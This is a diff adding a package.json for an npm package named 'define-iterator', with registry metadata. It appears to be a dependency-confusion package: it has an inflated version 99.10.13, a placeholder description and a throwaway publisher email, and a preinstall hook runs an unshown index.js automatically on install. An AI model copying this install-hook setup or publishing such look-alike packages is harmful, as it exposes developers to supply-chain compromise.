@@ -1,0 +1,39 @@
+{
+    "name": "define-iterator",
+    "version": "99.10.13",
+    "description": "rukkaz package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "define-iterator@99.10.13",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-iykJgizXXup2OuHpSyaxYSVN4dxQwRtCoqKBjtFLp6tpXWL+Tp7bSVOOaoew781brVsweJHTEwtWiYP8HScaCg==",
+        "shasum": "b15eb9bf36044fa87719423440244c384ce089d5",
+        "tarball": "https://registry.npmjs.org/define-iterator/-/define-iterator-99.10.13.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5073,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQOXJACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmqmhQ/9HJHNAtmed3Zd9OOr6WoXsFCGzxovEjGxG/JQAZUVzFPf2Ijf\r\nW3s85aa9fo7md0DYGz4r+FJMXt6xE0XcHxmLqjKEhTx8HFfzEVFNBXNj4tkI\r\nVzHgTfPGkgrWXvWANeWSictFvwG7vVb5weFVh8xQux+Zm+HAIekmjNSOOXvs\r\niCDkBDCh0POGdvZBIew5930VAlcY6sKSgD8azWBNaZexNPh0yREDKacVNoOb\r\nmUo3yknjKn86kBC3PIpLf1eZmS9/fetopFVC8fvgpELDmQW25Lg+WIDxVquL\r\nctetlui/cbVJk3VNrUIY6/TMF9+w62FoSvMLVfXPxkWpj6773uf0p1KpkP8J\r\n1eyaQFTmdqZYQUm7a1mAkc82WHagIiWXVF+Gy6N621cvPuZCg8nY0VVlhyGP\r\nsSwVu+uSIpVr28e42F0kTD0P5UkfYpXlFJp1gLrX2tjGBXcm9+CEO4fmDQfp\r\n+OHA9+J5BGYhaQ1BlcUKsQ26n8DU8XAax6v2VQPB4s6zzuvqhPbRlFN/IcYQ\r\nMFmgmUf5LWlUb4vA6o7gv2syueTzJ2gzcM+RDbIACqiQxyf8TvitwYQf93s2\r\n/oOqdx+/VhiNV6DuwLgg0Nr+pqjqC5OCDvK5TkX63cTMULIifhBMh2KNLf9W\r\nNSgIaV4y/QLqvvaiqvoK9mwD9YaV0WRduCQ=\r\n=ouQ2\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "8udbs9v7",
+        "email": "8udbs9v7@33mail.ga"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "8udbs9v7",
+            "email": "8udbs9v7@33mail.ga"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/define-iterator_99.10.13_1648420297314_0.9455192509160482"
+    },
+    "_hasShrinkwrap": false
+}
